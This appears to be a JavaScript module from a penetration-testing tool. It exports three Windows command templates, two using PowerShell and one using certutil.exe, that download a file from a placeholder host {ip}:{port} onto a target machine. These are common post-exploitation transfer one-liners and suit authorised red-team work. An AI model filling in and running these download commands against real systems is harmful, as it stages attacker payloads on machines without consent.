export default [
  {
    name: 'PowerShell 1',
    command:
      'powershell.exe -Command "Invoke-WebRequest -Uri http://{ip}:{port}/{source} -OutFile {destination}"',
  },
  {
    name: 'PowerShell 2',
    command:
      'powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile(\'http://{ip}:{port}/{source}\', {destination})"',
  },
  {
    name: 'CMD',
    command:
      'certutil.exe -urlcache -split -f http://{ip}:{port}/{source} {destination}',
  },
];
